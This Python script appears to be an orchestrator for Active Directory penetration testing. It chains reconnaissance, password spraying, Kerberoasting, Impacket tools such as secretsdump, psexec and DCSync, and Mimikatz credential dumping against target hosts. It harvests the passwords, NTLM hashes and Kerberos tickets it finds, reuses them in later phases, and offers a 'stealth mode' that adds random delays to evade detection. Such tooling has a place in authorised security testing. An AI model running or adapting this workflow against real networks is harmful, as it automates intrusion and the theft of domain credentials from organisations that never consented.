#!/usr/bin/env python3
import argparse
import subprocess
import os
import sys
import json
import time
from datetime import datetime
from pathlib import Path
from typing import List, Dict, Any, Optional, Tuple

from utils import Colors, Logger, execute_command, save_results

# Import shared configuration
try:
    from config import (
        TARGETS, DOMAIN_USERS, DOMAIN_PASSWORDS, NTLM_HASHES,
        LOG_DIRECTORY, RESULTS_DIRECTORY
    )
except ImportError:
    print("Error: config.py not found. Please ensure it exists in the current directory.")
    sys.exit(1)

class ADPentestWorkflow:
    """Orchestrates the AD pentesting workflow by integrating all toolkit scripts"""
    
    def __init__(self):
        self.results_dir = Path(RESULTS_DIRECTORY) / "workflow"
        self.results_dir.mkdir(parents=True, exist_ok=True)
        self.start_time = None
        self.end_time = None
        
        # Initialize credential store for found credentials
        self.credentials = []
        self.hashes = []
        self.tickets = []
        
        # Directory structure
        self.script_dir = Path(__file__).parent.absolute()
        
        # Initialize the tools paths
        self.netexec_script = self.script_dir / "netexec-enumerator.py"
        self.kerberoast_script = self.script_dir / "kerberoast.py"
        self.impacket_script = self.script_dir / "impacket-toolkit.py"
        self.powershell_script = self.script_dir / "powershell-enumeration.py"
        self.sharpview_script = self.script_dir / "sharpview-automator.py"
        self.mimikatz_script = self.script_dir / "mimikatz-wrapper.py"
        self.adpentest_script = self.script_dir / "adpentest-toolkit.py"
        
        # Verify tools exist
        self.verify_tools()
        
    def verify_tools(self) -> bool:
        """Verify all required tools exist"""
        tools = {
            "NetExec Enumerator": self.netexec_script,
            "Kerberoasting Automation": self.kerberoast_script,
            "Impacket Toolkit": self.impacket_script,
            "PowerShell Enumeration": self.powershell_script,
            "SharpView Automator": self.sharpview_script,
            "Mimikatz Wrapper": self.mimikatz_script,
            "AD Pentest Toolkit": self.adpentest_script
        }
        
        Logger.section("Verifying AD Pentest Toolkit Scripts")
        
        all_tools_found = True
        for name, path in tools.items():
            if path.exists():
                Logger.success(f"{name} found at {path}")
            else:
                Logger.error(f"{name} not found at {path}")
                all_tools_found = False
        
        if not all_tools_found:
            Logger.warning("Some tools are missing. Workflow functionality will be limited.")
        
        return all_tools_found
    
    def execute_command(self, command: str, description: str) -> str:
        """Execute a shell command and return its output"""
        try:
            Logger.command(command)
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            output = result.stdout if result.stdout else result.stderr
            
            if result.returncode == 0:
                if output.strip():
                    Logger.success(f"Successfully completed: {description}")
                else:
                    Logger.info("Command completed but no output returned")
            else:
                Logger.error(f"Command failed: {output}")
                
            return output
        except Exception as e:
            Logger.error(f"Error executing command: {str(e)}")
            return str(e)
    
    def save_results(self, output: str, phase: str) -> Path:
        """Save workflow results to a file"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"workflow_{phase}_{timestamp}.txt"
        filepath = self.results_dir / filename
        
        with open(filepath, 'w') as f:
            f.write(output)
        
        Logger.success(f"Results saved to {filepath}")
        return filepath
    
    def save_json_results(self, data: dict, phase: str) -> Path:
        """Save workflow results as JSON"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"workflow_{phase}_{timestamp}.json"
        filepath = self.results_dir / filename
        
        with open(filepath, 'w') as f:
            json.dump(data, f, indent=4)
        
        Logger.success(f"Results saved to {filepath}")
        return filepath
    
    def add_credentials(self, domain: str, username: str, password: str, source: str) -> None:
        """Add discovered credentials to the store"""
        cred = {
            "domain": domain,
            "username": username,
            "password": password,
            "hash": None,
            "source": source,
            "timestamp": str(datetime.now())
        }
        
        # Check if credential already exists
        for existing_cred in self.credentials:
            if (existing_cred["domain"] == domain and 
                existing_cred["username"] == username and 
                existing_cred["password"] == password):
                return
        
        self.credentials.append(cred)
        Logger.success(f"Added credentials for {domain}\\{username} from {source}")
    
    def add_hash(self, domain: str, username: str, ntlm_hash: str, source: str) -> None:
        """Add discovered NTLM hash to the store"""
        hash_entry = {
            "domain": domain,
            "username": username,
            "hash": ntlm_hash,
            "source": source,
            "timestamp": str(datetime.now())
        }
        
        # Check if hash already exists
        for existing_hash in self.hashes:
            if (existing_hash["domain"] == domain and 
                existing_hash["username"] == username and 
                existing_hash["hash"] == ntlm_hash):
                return
        
        self.hashes.append(hash_entry)
        Logger.success(f"Added hash for {domain}\\{username} from {source}")
    
    def add_ticket(self, ticket_type: str, target: str, ticket_path: str, source: str) -> None:
        """Add discovered Kerberos ticket to the store"""
        ticket_entry = {
            "type": ticket_type,
            "target": target,
            "path": ticket_path,
            "source": source,
            "timestamp": str(datetime.now())
        }
        
        self.tickets.append(ticket_entry)
        Logger.success(f"Added {ticket_type} ticket for {target} from {source}")
    
    def parse_creds_from_output(self, output: str, source: str) -> None:
        """Parse credentials from tool output"""
        # Look for common credential patterns
        # Pattern: domain\username:password
        domain_user_pass = re.findall(r'([^\\:]+)\\([^:]+):([^\s]+)', output)
        for domain, username, password in domain_user_pass:
            self.add_credentials(domain, username, password, source)
        
        # Pattern: username:password
        user_pass = re.findall(r'([^:\\]+):([^\s]+)', output)
        for username, password in user_pass:
            if '\\' not in username and ':' not in username:
                self.add_credentials("", username, password, source)
        
        # Look for NTLM hashes
        # Pattern: username::domain:hash
        ntlm_hashes = re.findall(r'([^:]+)::([^:]+):([a-fA-F0-9]{32})', output)
        for username, domain, ntlm_hash in ntlm_hashes:
            self.add_hash(domain, username, ntlm_hash, source)
    
    def run_initial_recon(self, targets: List[str]) -> Dict[str, Any]:
        """Run initial reconnaissance to identify live hosts and services"""
        Logger.section("Initial Reconnaissance")
        
        recon_results = {
            "targets": targets,
            "live_hosts": [],
            "services": {}
        }
        
        for target in targets:
            Logger.subsection(f"Scanning target: {target}")
            
            # Check if host is reachable
            ping_output = self.execute_command(f"ping -c 1 {target}", f"Pinging {target}")
            
            if "1 received" in ping_output or "TTL=" in ping_output:
                Logger.success(f"{target} is reachable")
                recon_results["live_hosts"].append(target)
                
                # Check for common services
                service_ports = {
                    "SMB": 445,
                    "LDAP": 389,
                    "LDAPS": 636,
                    "Kerberos": 88,
                    "RPC": 135,
                    "WinRM": 5985
                }
                
                target_services = {}
                
                for service, port in service_ports.items():
                    nc_output = self.execute_command(
                        f"nc -zv -w 1 {target} {port} 2>&1", 
                        f"Checking {service} ({port}) on {target}"
                    )
                    
                    if "succeeded" in nc_output or "open" in nc_output:
                        Logger.success(f"{service} is available on {target}")
                        target_services[service] = True
                    else:
                        target_services[service] = False
                
                recon_results["services"][target] = target_services
            else:
                Logger.warning(f"{target} is not reachable")
        
        # Save reconnaissance results
        self.save_json_results(recon_results, "initial_recon")
        
        return recon_results
    
    def run_password_spray(self, targets: List[str]) -> Dict[str, Any]:
        """Run password spraying to obtain initial access"""
        Logger.section("Password Spraying")
        
        spray_results = {
            "targets": targets,
            "successful_logins": []
        }
        
        for target in targets:
            if self.adpentest_script.exists():
                spray_cmd = f"python3 {self.adpentest_script} spray -t {target}"
                spray_output = self.execute_command(spray_cmd, f"Password spraying against {target}")
                
                # Parse output for successful logins
                self.parse_creds_from_output(spray_output, f"password_spray_{target}")
                
                # Check if the spray was successful
                if "Successful login" in spray_output:
                    Logger.success(f"Password spray against {target} was successful")
                    # Extract successful login details from output
                    login_matches = re.findall(r"Successful login: ([^:]+):([^ ]+) on ([^\s]+)", spray_output)
                    for username, password, host in login_matches:
                        login_entry = {
                            "target": host,
                            "username": username,
                            "password": password
                        }
                        spray_results["successful_logins"].append(login_entry)
                        self.add_credentials("", username, password, f"password_spray_{target}")
        
        # Save password spray results
        self.save_json_results(spray_results, "password_spray")
        
        return spray_results
    
    def run_netexec_enum(self, targets: List[str]) -> Dict[str, Any]:
        """Run NetExec enumeration against targets"""
        Logger.section("NetExec Enumeration")
        
        enum_results = {
            "targets": targets,
            "results": {}
        }
        
        # Use discovered credentials if available, otherwise use defaults from config
        creds_to_use = self.credentials if self.credentials else [
            {"domain": "", "username": user, "password": passwd, "hash": None} 
            for user in DOMAIN_USERS for passwd in DOMAIN_PASSWORDS
        ]
        
        for target in targets:
            target_results = []
            
            for cred in creds_to_use:
                if self.netexec_script.exists():
                    # Set credentials
                    self.execute_command(
                        f"python3 {self.netexec_script} set username {cred['username']}",
                        "Setting username for NetExec"
                    )
                    
                    if cred['password']:
                        self.execute_command(
                            f"python3 {self.netexec_script} set password {cred['password']}",
                            "Setting password for NetExec"
                        )
                    
                    # Set target
                    self.execute_command(
                        f"python3 {self.netexec_script} set target {target}",
                        f"Setting target to {target} for NetExec"
                    )
                    
                    # Run enumeration for various service types
                    services = "smb,users,creds,spider,policy"
                    enum_output = self.execute_command(
                        f"python3 {self.netexec_script} enum {services}",
                        f"Running NetExec enumeration against {target}"
                    )
                    
                    self.parse_creds_from_output(enum_output, f"netexec_{target}")
                    
                    target_results.append({
                        "credential": f"{cred['username']}:{cred['password'] if cred['password'] else 'HASH'}",
                        "output_summary": enum_output[:500] + "..." if len(enum_output) > 500 else enum_output
                    })
            
            enum_results["results"][target] = target_results
        
        # Save NetExec enumeration results
        self.save_json_results(enum_results, "netexec_enum")
        
        return enum_results
    
    def run_kerberoasting(self, targets: List[str]) -> Dict[str, Any]:
        """Run Kerberoasting against targets"""
        Logger.section("Kerberoasting")
        
        kerberoast_results = {
            "targets": targets,
            "results": {}
        }
        
        targets_str = " ".join(targets)
        
        if self.kerberoast_script.exists():
            kerberoast_output = self.execute_command(
                f"python3 {self.kerberoast_script} -t {targets_str}",
                "Running Kerberoasting"
            )
            
            # Parse output for tickets and hashes
            self.parse_creds_from_output(kerberoast_output, "kerberoasting")
            
            # Check for successful Kerberoasting
            for target in targets:
                if f"Successfully Kerberoasted {target}" in kerberoast_output:
                    Logger.success(f"Kerberoasting against {target} was successful")
                    
                    # Extract ticket information
                    ticket_files = re.findall(r"Ticket saved to ([^\s]+)", kerberoast_output)
                    for ticket_file in ticket_files:
                        path = Path(ticket_file)
                        if path.exists():
                            self.add_ticket("TGS", target, str(path), "kerberoasting")
                            kerberoast_results.setdefault("results", {}).setdefault(target, {}).setdefault("tickets", []).append(str(path))
        
        # Save Kerberoasting results
        self.save_json_results(kerberoast_results, "kerberoasting")
        
        return kerberoast_results
    
    def run_impacket_toolkit(self, targets: List[str]) -> Dict[str, Any]:
        """Run Impacket tools against targets"""
        Logger.section("Impacket Toolkit")
        
        impacket_results = {
            "targets": targets,
            "results": {}
        }
        
        for target in targets:
            target_results = {}
            
            if self.impacket_script.exists():
                # Run all Impacket tools
                impacket_output = self.execute_command(
                    f"python3 {self.impacket_script} all -t {target}",
                    f"Running all Impacket tools against {target}"
                )
                
                self.parse_creds_from_output(impacket_output, f"impacket_{target}")
                
                # Extract results for specific tools
                tools = ["secretsdump", "smbclient", "psexec", "wmiexec", "asreproast", "dcsync"]
                
                for tool in tools:
                    tool_success = f"Successfully performed {tool}" in impacket_output
                    target_results[tool] = tool_success
                    
                    if tool_success:
                        Logger.success(f"{tool} was successful against {target}")
            
            impacket_results["results"][target] = target_results
        
        # Save Impacket toolkit results
        self.save_json_results(impacket_results, "impacket_toolkit")
        
        return impacket_results
    
    def run_powershell_enum(self, targets: List[str]) -> Dict[str, Any]:
        """Run PowerShell enumeration against targets"""
        Logger.section("PowerShell Enumeration")
        
        posh_results = {
            "targets": targets,
            "results": {}
        }
        
        # Use discovered credentials if available, otherwise use defaults from config
        creds_to_use = self.credentials if self.credentials else [
            {"domain": "", "username": user, "password": passwd, "hash": None} 
            for user in DOMAIN_USERS for passwd in DOMAIN_PASSWORDS
        ]
        
        for target in targets:
            for cred in creds_to_use:
                if self.powershell_script.exists() and cred['password']:
                    posh_output = self.execute_command(
                        f"python3 {self.powershell_script} remote -t {target} -u {cred['username']} -p {cred['password']}",
                        f"Running PowerShell enumeration against {target}"
                    )
                    
                    # Check for successful enumeration
                    if "AD Enumeration Complete" in posh_output:
                        Logger.success(f"PowerShell enumeration against {target} was successful")
                        posh_results["results"][target] = {
                            "success": True,
                            "credential": f"{cred['username']}:{cred['password']}",
                            "summary": posh_output[:500] + "..." if len(posh_output) > 500 else posh_output
                        }
                        break
                    else:
                        posh_results["results"][target] = {
                            "success": False
                        }
        
        # Save PowerShell enumeration results
        self.save_json_results(posh_results, "powershell_enum")
        
        return posh_results
    
    def run_sharpview_enum(self, targets: List[str]) -> Dict[str, Any]:
        """Run SharpView enumeration against targets"""
        Logger.section("SharpView Enumeration")
        
        sharpview_results = {
            "targets": targets,
            "results": {}
        }
        
        # Use discovered credentials if available, otherwise use defaults from config
        creds_to_use = self.credentials if self.credentials else [
            {"domain": "", "username": user, "password": passwd, "hash": None} 
            for user in DOMAIN_USERS for passwd in DOMAIN_PASSWORDS
        ]
        
        for target in targets:
            for cred in creds_to_use:
                if self.sharpview_script.exists() and cred['password']:
                    sharpview_output = self.execute_command(
                        f"python3 {self.sharpview_script} full -t {target} -u {cred['username']} -p {cred['password']}",
                        f"Running SharpView enumeration against {target}"
                    )
                    
                    # Check for successful enumeration
                    if "AD Enumeration Complete" in sharpview_output:
                        Logger.success(f"SharpView enumeration against {target} was successful")
                        sharpview_results["results"][target] = {
                            "success": True,
                            "credential": f"{cred['username']}:{cred['password']}",
                            "summary": sharpview_output[:500] + "..." if len(sharpview_output) > 500 else sharpview_output
                        }
                        break
                    else:
                        sharpview_results["results"][target] = {
                            "success": False
                        }
        
        # Save SharpView enumeration results
        self.save_json_results(sharpview_results, "sharpview_enum")
        
        return sharpview_results
    
    def run_mimikatz(self, targets: List[str]) -> Dict[str, Any]:
        """Run Mimikatz against targets"""
        Logger.section("Mimikatz")
        
        mimikatz_results = {
            "targets": targets,
            "results": {}
        }
        
        # Use discovered credentials if available, otherwise use defaults from config
        creds_to_use = self.credentials if self.credentials else [
            {"domain": "", "username": user, "password": passwd, "hash": None} 
            for user in DOMAIN_USERS for passwd in DOMAIN_PASSWORDS
        ]
        
        for target in targets:
            for cred in creds_to_use:
                if self.mimikatz_script.exists() and (cred['password'] or cred['hash']):
                    domain = cred['domain'] if cred['domain'] else "."
                    
                    if cred['password']:
                        mimikatz_output = self.execute_command(
                            f"python3 {self.mimikatz_script} remote -t {target} -d {domain} -u {cred['username']} -p {cred['password']}",
                            f"Running Mimikatz against {target} with password"
                        )
                    elif cred['hash']:
                        mimikatz_output = self.execute_command(
                            f"python3 {self.mimikatz_script} remote -t {target} -d {domain} -u {cred['username']} -H {cred['hash']}",
                            f"Running Mimikatz against {target} with hash"
                        )
                    
                    self.parse_creds_from_output(mimikatz_output, f"mimikatz_{target}")
                    
                    # Check for successful execution
                    if "Credential dumping completed" in mimikatz_output:
                        Logger.success(f"Mimikatz against {target} was successful")
                        mimikatz_results["results"][target] = {
                            "success": True,
                            "credential": f"{cred['username']}:{cred['password'] if cred['password'] else cred['hash']}",
                            "summary": mimikatz_output[:500] + "..." if len(mimikatz_output) > 500 else mimikatz_output
                        }
                        break
                    else:
                        mimikatz_results["results"][target] = {
                            "success": False
                        }
        
        # Save Mimikatz results
        self.save_json_results(mimikatz_results, "mimikatz")
        
        return mimikatz_results
    
    def run_full_workflow(self, targets: List[str], stealth: bool = False, skip_steps: List[str] = None) -> Dict[str, Any]:
        """Run the full AD pentesting workflow"""
        self.start_time = datetime.now()
        
        Logger.section("Starting Full AD Penetration Testing Workflow")
        Logger.info(f"Start Time: {self.start_time}")
        Logger.info(f"Targets: {', '.join(targets)}")
        Logger.info(f"Stealth Mode: {'Enabled' if stealth else 'Disabled'}")
        
        if skip_steps:
            Logger.info(f"Skipping steps: {', '.join(skip_steps)}")
        
        skip_steps = skip_steps or []
        workflow_results = {
            "start_time": str(self.start_time),
            "targets": targets,
            "stealth": stealth,
            "skipped_steps": skip_steps,
            "phases": {}
        }
        
        # Phase 1: Initial Reconnaissance
        if "recon" not in skip_steps:
            Logger.info("Starting Phase 1: Initial Reconnaissance")
            recon_results = self.run_initial_recon(targets)
            workflow_results["phases"]["recon"] = recon_results
            
            # Sleep for a bit if in stealth mode
            if stealth:
                sleep_time = 30 + int(random.random() * 30)
                Logger.info(f"Stealth mode active - sleeping for {sleep_time} seconds...")
                time.sleep(sleep_time)
        
        # Phase 2: Password Spraying
        if "spray" not in skip_steps:
            Logger.info("Starting Phase 2: Password Spraying")
            spray_results = self.run_password_spray(targets)
            workflow_results["phases"]["spray"] = spray_results
            
            # Sleep for a bit if in stealth mode
            if stealth:
                sleep_time = 30 + int(random.random() * 30)
                Logger.info(f"Stealth mode active - sleeping for {sleep_time} seconds...")
                time.sleep(sleep_time)
        
        # Phase 3: NetExec Enumeration
        if "netexec" not in skip_steps:
            Logger.info("Starting Phase 3: NetExec Enumeration")
            netexec_results = self.run_netexec_enum(targets)
            workflow_results["phases"]["netexec"] = netexec_results
            
            # Sleep for a bit if in stealth mode
            if stealth:
                sleep_time = 30 + int(random.random() * 30)
                Logger.info(f"Stealth mode active - sleeping for {sleep_time} seconds...")
                time.sleep(sleep_time)
        
        # Phase 4: Kerberoasting
        if "kerberoast" not in skip_steps:
            Logger.info("Starting Phase 4: Kerberoasting")
            kerberoast_results = self.run_kerberoasting(targets)
            workflow_results["phases"]["kerberoast"] = kerberoast_results
            
            # Sleep for a bit if in stealth mode
            if stealth:
                sleep_time = 30 + int(random.random() * 30)
                Logger.info(f"Stealth mode active - sleeping for {sleep_time} seconds...")
                time.sleep(sleep_time)
        
        # Phase 5: Impacket Toolkit
        if "impacket" not in skip_steps:
            Logger.info("Starting Phase 5: Impacket Toolkit")
            impacket_results = self.run_impacket_toolkit(targets)
            workflow_results["phases"]["impacket"] = impacket_results
            
            # Sleep for a bit if in stealth mode
            if stealth:
                sleep_time = 30 + int(random.random() * 30)
                Logger.info(f"Stealth mode active - sleeping for {sleep_time} seconds...")
                time.sleep(sleep_time)
        
        # Phase 6: PowerShell Enumeration
        if "powershell" not in skip_steps:
            Logger.info("Starting Phase 6: PowerShell Enumeration")
            posh_results = self.run_powershell_enum(targets)
            workflow_results["phases"]["powershell"] = posh_results
            
            # Sleep for a bit if in stealth mode
            if stealth:
                sleep_time = 30 + int(random.random() * 30)
                Logger.info(f"Stealth mode active - sleeping for {sleep_time} seconds...")
                time.sleep(sleep_time)
        
        # Phase 7: SharpView Enumeration
        if "sharpview" not in skip_steps:
            Logger.info("Starting Phase 7: SharpView Enumeration")
            sharpview_results = self.run_sharpview_enum(targets)
            workflow_results["phases"]["sharpview"] = sharpview_results
            
            # Sleep for a bit if in stealth mode
            if stealth:
                sleep_time = 30 + int(random.random() * 30)
                Logger.info(f"Stealth mode active - sleeping for {sleep_time} seconds...")
                time.sleep(sleep_time)
        
        # Phase 8: Mimikatz Credential Harvesting
        if "mimikatz" not in skip_steps:
            Logger.info("Starting Phase 8: Mimikatz Credential Harvesting")
            mimikatz_results = self.run_mimikatz(targets)
            workflow_results["phases"]["mimikatz"] = mimikatz_results
        
        # Complete the workflow
        self.end_time = datetime.now()
        duration = self.end_time - self.start_time
        
        workflow_results["end_time"] = str(self.end_time)
        workflow_results["duration"] = str(duration)
        workflow_results["credentials"] = self.credentials
        workflow_results["hashes"] = self.hashes
        workflow_results["tickets"] = self.tickets
        
        Logger.section("AD Penetration Testing Workflow Complete")
        Logger.info(f"Start Time: {self.start_time}")
        Logger.info(f"End Time: {self.end_time}")
        Logger.info(f"Duration: {duration}")
        Logger.info(f"Found {len(self.credentials)} sets of credentials")
        Logger.info(f"Found {len(self.hashes)} NTLM hashes")
        Logger.info(f"Found {len(self.tickets)} Kerberos tickets")
        
        # Save overall workflow results
        summary_file = self.results_dir / f"workflow_summary_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(summary_file, 'w') as f:
            json.dump(workflow_results, f, indent=4)
        
        Logger.success(f"Workflow summary saved to {summary_file}")
        
        return workflow_results

def main():
    parser = argparse.ArgumentParser(description=f'{Colors.BOLD}AD Pentest Workflow Orchestrator{Colors.ENDC}')
    
    parser.add_argument('-t', '--targets', nargs='+', help='Target IP addresses or hostnames')
    parser.add_argument('-s', '--stealth', action='store_true', help='Enable stealth mode with delays between operations')
    parser.add_argument('--skip', nargs='+', choices=['recon', 'spray', 'netexec', 'kerberoast', 'impacket', 'powershell', 'sharpview', 'mimikatz'], 
                        help='Skip specific workflow phases')
    
    args = parser.parse_args()
    
    workflow = ADPentestWorkflow()
    
    targets = args.targets or TARGETS
    if not targets:
        Logger.error("No targets specified. Add targets to config.py or provide them as arguments.")
        return
    
    workflow.run_full_workflow(targets, stealth=args.stealth, skip_steps=args.skip)

if __name__ == "__main__":
    import random
    import re
    main()